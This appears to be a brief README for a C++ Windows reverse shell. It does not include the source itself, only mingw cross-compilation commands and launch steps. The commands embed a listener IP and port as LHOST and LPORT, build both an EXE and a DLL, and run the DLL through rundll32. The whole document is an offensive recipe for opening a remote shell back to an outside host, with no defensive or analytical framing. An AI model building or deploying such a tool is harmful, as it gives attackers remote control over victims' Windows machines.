# Windows Reverse Shell in C++

Compilation:

~~~ bash
x86_64-w64-mingw32-gcc -Wall -Wextra -O2 ./shell.cpp -o ./shell.exe -lws2_32 -D LHOST=172.30.253.1 -D LPORT=7002
x86_64-w64-mingw32-gcc -Wall -Wextra -O2 -shared ./shell.cpp -o ./shell.dll -lws2_32 -D LHOST=172.30.253.1 -D LPORT=7002
~~~

Execution:

~~~ bash
.\shell.exe
rundll32.exe .\shell.dll,Nop
~~~
